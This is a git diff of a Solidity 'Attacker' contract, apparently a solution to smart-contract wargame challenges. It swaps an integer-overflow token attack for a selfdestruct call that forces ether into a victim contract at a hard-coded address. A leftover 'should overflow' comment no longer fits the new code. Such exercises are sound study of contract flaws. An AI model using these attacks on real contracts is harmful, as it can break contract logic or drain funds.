@@ -1,21 +1,32 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "./token.sol";
+import "./Force.sol";
 
 contract Attacker {
-    Token victimContract; //Contractname contractvariable
-    uint maxInt = 21000 - 1;
-    address playerAddress = 0x81215d34367AF48d01E728AfF2976d9Df32fE604;
+    Force victimContract; //Contractname contractvariable
 
+    address payable victimAddress = 0xD3a8e62a14410F3bCA078A2d7ccE422Bf0B77C48; 
+    event depositEmitter(address indexed senderAddr, uint senderValue, uint currentBalance);
+    event selfDestructEmitter(address indexed senderAddr);
+
+    
     // import a contract
-    constructor(address tokenAddress) public {
-        victimContract = Token(tokenAddress);
+    constructor() public {
+        victimContract = Force(victimAddress);
     }
 
-    function sendAttackMessage() external {
+    function depositMoney() public payable {
+        // Should emit the current balance of the contrac
+        uint balance = address(this).balance;
+        emit depositEmitter(msg.sender, msg.value, balance);
+    }
+
+    function selfDestruct() external {
         // should overflow
-        victimContract.transfer(playerAddress, maxInt);
+        // victimContract.transfer(playerAddress);
+        emit selfDestructEmitter(msg.sender);
+        selfdestruct(victimAddress);
     }
 
     // function sendAttackerMessage(address _attackerAddress) external{
